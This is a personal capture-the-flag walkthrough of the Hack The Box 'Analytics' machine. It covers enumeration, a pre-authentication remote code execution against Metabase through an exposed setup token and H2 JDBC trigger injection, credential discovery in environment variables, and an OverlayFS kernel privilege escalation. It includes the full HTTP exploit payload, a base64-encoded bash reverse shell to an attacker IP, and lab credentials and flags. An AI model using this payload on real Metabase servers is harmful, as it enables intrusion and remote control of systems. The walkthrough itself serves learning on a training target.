---
title: HTB 6 - Analytics 
tag: htb
category: cyber
---

## Comments

This box was an example of why I should also build up a basic understanding of the various common exploits before jumping in. This was an otherwise easy box but I was stuck at trying to crack a password when I could have read it off one of the common files.

Additionally, the root exploit also used a technique that was completely new to me, but seems pretty straightforward. I will do a writeup on that technique below as part me trying to learn what it does.

Other than that, the techniques were straightforward. The machine was a little buggy and had to be reset multiple times. Also, an injection that worked the first time stopped working after, so maybe someone changed something on the system. 

## Walkthrough

Target IP: 

    10.10.11.233

### Enumeration

Start with nmap scan:

    PORT   STATE SERVICE REASON  VERSION
    22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
    80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
    | http-methods: 
    |_  Supported Methods: GET HEAD POST OPTIONS
    |_http-server-header: nginx/1.18.0 (Ubuntu)
    |_http-title: Did not follow redirect to http://analytical.htb/
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Normal response, we see `ssh` and `http` ports open.

Add `http://analytical.htb ` to hosts first.

Before we go explore the webpage, start a directory and DNS fuzz to run concurrently. 

     ./ffuf -w ~/Downloads/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://analytical.htb -H "Host: FUZZ" -fw 4

    ./ffuf -w ~/Downloads/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://analytical.htb/FUZZ -fw 4

    (-fw 4 will remove false positives which typically have word length 4 in the response)

The DNS fuzz will return no results while the directory fuzz will return the standard web directories:

    images                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 171ms]
    css                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 170ms]
    js                      [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 182ms]

Going to the webpage, we see that it is a data analytics service provider. Take note of the name of the engineers, they may come in handy later.

    johnny smith
    alex kirigo
    daniel walker 

There is a login page which could be our way in. The login page is hosted at `http://data.analytical.htb/`, so let's add that to our `/etc/hosts` and explore.

The `data.` subdomain actually runs on Metabase, and what we see at the login is a Metabase login page.

>> Explain Metabase

The login requires an email so it's unlikely to accept random string input. I tried with the email I found in the main page
`demo@analytical.com : password` but that failed. 

Exploring the HTTP response for Metabase login further and searching for `version` keyword, we see that it is on v0.46.6.

    "version":{"date":"2023-06-29","tag":"v0.46.6","branch":"release-x.46.x","hash":"1bb88f5"}

Quick search shows [possible RCE](https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/) without having to login.

The vulnerability relates to having some secret tokens exposed in the Metabase API. First, we can access `http://data.analytical.htb/api/sessions/properties` to see configuration details of our session.

Specifically, the `setup-token` is exposed:

    249fa03d-fd94-4d5b-b94f-b4ebf3df681f

The token is also visible in the source code of the login page, so either way you can get the token.

This token was generated when Metabase was being setup for the server. Hence, when supplied, it allows us to call `/setup` related API functions which are vulnerable.

Note on how this got exposed, based on the RCE article:
Apparently, there was some code refactoring that was committed around Jan2022. The refactoring affected the function which was supposed to clear out setup tokens once they were no longer needed. Hence, only Metabase instances using affected versions that were installed **after** this commit in Jan2022 are affected.

Based on the article, `/api/setup/validate` API call can be used to validate a connection with a database used by Metabase. This uses a SQL statement to communicate with the database, and hence SQL injection is possible.

I also explored the rest of [Metabase APIs](https://www.metabase.com/docs/latest/api-documentation).

First, prepare the reverse shell:

    echo "bash -i >&/dev/tcp/10.10.14.133/1234 0>&1" | base64
    
    >> YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE0LjEzMy8xMjM0IDA+JjEK
    
Then, send a `POST` to the `/validate` endpoint with our RCE payload:

    POST /api/setup/validate HTTP/1.1
    Host: data.analytical.htb
    Content-Type: application/json
    Content-Length: 828

    {
        "token": "249fa03d-fd94-4d5b-b94f-b4ebf3df681f",
        "details":
        {
            "is_on_demand": false,
            "is_full_sync": false,
            "is_sample": false,
            "cache_ttl": null,
            "refingerprint": false,
            "auto_run_queries": true,
            "schedules":
            {},
            "details":
            {
                "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,INSERT_YOUR_BASE64_PAYLOAD_HERE}|{base64,-d}|{bash,-i}')\n$$--=x",
                "advanced-options": false,
                "ssl": true
            },
            "name": "an-sec-research-team",
            "engine": "h2"
        }
    }

This will give us a reverse shell.

Note: I could only get this to work the first time, subsequent reverse shells gave me an error trying to `CREATE TRIGGER` so there may be something wrong with the machine.

How does this work? I will attempt to explaint the exploit code.

Essentially, we are telling the server to check its connection with a certain database, specified by the string in the format of Java Database Connectivity (JDBC) string. In addition to the initial connection string, SQL statements can also be chained (usually not allowed) within the string itself, leading to this vulnerability.

Let's break down the entire JDBC string:

    zip:/app/metabase.jar!/sample-database.db;

This step tells us to use `zip` to access the dummy database located at `/app/metabase.jar!/sample-database.db`. Since the database is located inside the `.jar`, we need to unzip it first.
The `!` is used to specify when the resource is located **inside** a compressed archive. Hence, `!/sample-database.db`.

    MODE=MSSQLServer;


`MODE` just tells H2 to run using SQL Server syntax.

        TRACE_LEVEL_SYSTEM_OUT=1\\;

Typically, we cannot chain SQL statements after the database is connected. One option is `INIT` but this doesn't work here as the keyword is blocked (this keyword check can actually be overcome by using letters like Ǐ instead of I). Another is `TRACE_LEVEL_SYSTEM_OUT` which does. Once this is run, we can run arbitrary SQL statements

    CREATE TRIGGER pwnshell 
    BEFORE SELECT ON INFORMATION_SCHEMA.TABLES 

A trigger is a SQL query that will run based on some other query. In this case, before `INFORMATION_SCHEMA.TABLES` is queried, we will run our trigger. We can put any SQL or Java command inside because the `CREATE TRIGGER` [command](https://www.h2database.com/html/commands.html#create_trigger) explicitly allows both SQL and Java commands. It functions similar to `CREATE ALIAS` which has a [similar exploit](https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html).

    AS 

    $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,INSERT_YOUR_BASE64_PAYLOAD_HERE}|{base64,-d}|{bash,-i}')\n$$

This translates to:

    $$ --> this is a SQL string block

    //javascript ---> this is a comment

    java.lang.Runtime.getRuntime().exec('bash -c {echo,INSERT_YOUR_BASE64_PAYLOAD_HERE}|{base64,-d}|{bash,-i}')

    $$

The rest of the function is the standard reverse shell called from command line.


### Lateral Movement

We have logged in as `metabase` with limited privileges but not the user. This is simply the account that manages the `metabase` server.

There are only 2 files in the user directory:

    metabase.db.mv.db
    metabase.db.trace.db

Also, `/app` directory contains the Metabase installation file:

    metabase.jar

The `.mv.db` extension is where the data is stored. This is a H2 database which can be opened after downloading the H2 database driver into our local machine. Note that you must use the correct H2 version that was used to create the file.

In this case, I ran the `java -jar metabase.jar` and in the logs you will see a reference to version `2.1.212` for H2

    2023-10-14 15:41:29,158 INFO db.setup :: Verifying h2 Database Connection ...
    2023-10-14 15:41:29,546 INFO db.setup :: Successfully verified H2 2.1.212 (2022-04-09) application database connection. ✅

I transferred out the 2 files and attempted to view them with H2. However, the file itself is password protected, and I spent a long time trying to find the password.

Instead of trying to open the database, I `cat` it instead to see if they was any plaintext. 

Along line 392, there was some plaintext:

    metalytics@analytical.htb   JJohnnyISmith
    <$2a$10$HnyM8tXhWXhlxEtfzNJE0.z.aA6xkb5ydTRxV5uO5v7IxfoZm08LG

We have a username, email, and valid bcrypt password hash. Next, I tried to crack the hash with `john` but there was no progress, making me suspect that the hash wasn't the right approach.

At this point, after more hours of searching, I realised from reading a walkthrough that there was a simple command that I did not know of:

    env 

This basically shows all the environment variables used by the `metabase` user. Amongst them were credentials for another account:

    metalytics
    An4lytics_ds20223#

I guess that's why `john` didn't work - the password was too complex.

We can use this account to login to the `data.analytical.htb` page, but there is nothing of interest there. It basically displays the same information as the `.mv.db` file.

Next, I tried an SSH which worked, and easily got the user.txt = 9f1e43916e2d967ce23b40d11f78e2de

We don't have `sudo` privileges in `metalytics`. There are also no processes running as `root`, and all the available `bin` functions are not set with `SUID` so we cannot use that escape either.

Again, there is an exploit that was new to me - exploiting the Linux kernel itself.

If we check the kernel version:

    uname -a

    >>
    Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux

Version `6.2.0-25` is vulnerable to the recent Jul2023 OverlayFS exploit documented [here](https://scientyficworld.org/overlayfs-cve-2021-3493/).

Downloading and running the exploit on the target gives us `root` immediately (root.txt = 1567e6a4bbe24a808e586b7deee3920b
), but I would like to (try) to explain why.

OverlayFS is a kernel module that allows multiple file systems to be combined, while managing their access permissions. This is useful when certain applications need to read from `root` or write to a temporary file system. 

In module, there is a line that checks if the user has permissions to set file capabilities (finer control than root/ no root etc.) before changing them. When this same operation is forwarded to the underlying system to run, it skips the check and allows the user to set file capabilities on the underlying system. 

To exploit this, we can create an executable in the user system, which then gets copied (synced) to the higher system but with root privileges. From there, the executable can be triggered and give root access.

References:
<https://ssd-disclosure.com/ssd-advisory-overlayfs-pe/>
<https://scientyficworld.org/overlayfs-cve-2021-3493/>
<https://www.wiz.io/blog/ubuntu-overlayfs-vulnerability>



*That's all for tonight, ciao.*


